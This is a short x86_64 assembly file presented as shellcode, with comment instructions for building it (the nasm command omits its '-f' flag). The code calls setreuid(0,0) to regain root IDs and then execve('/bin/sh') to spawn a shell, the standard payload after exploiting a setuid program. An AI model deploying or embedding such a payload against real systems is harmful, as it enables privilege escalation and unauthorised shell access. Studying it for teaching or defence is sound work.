;--------------------------------------------------------------------------
; This is an shellcode in architecture x86_64
; For assembled the code: 
; 1. nasm elf64 shellcode_x86_64.asm -o shellcode.o
; 2. ld -o shellcode shellcode.o
;--------------------------------------------------------------------------
global _start

section .data
    shell: db "/bin/sh", 0, 10
    sheel_len equ $- shell
section .text
    _start:
        mov rax, 113
        mov rdi, 0
        mov rsi, 0
        syscall
        jmp _shell

    _shell:
        mov rax, 59
        mov rdi, shell
        mov rsi, 0
        mov rdx, 0
        syscall
;--------------------------------------------------------------------------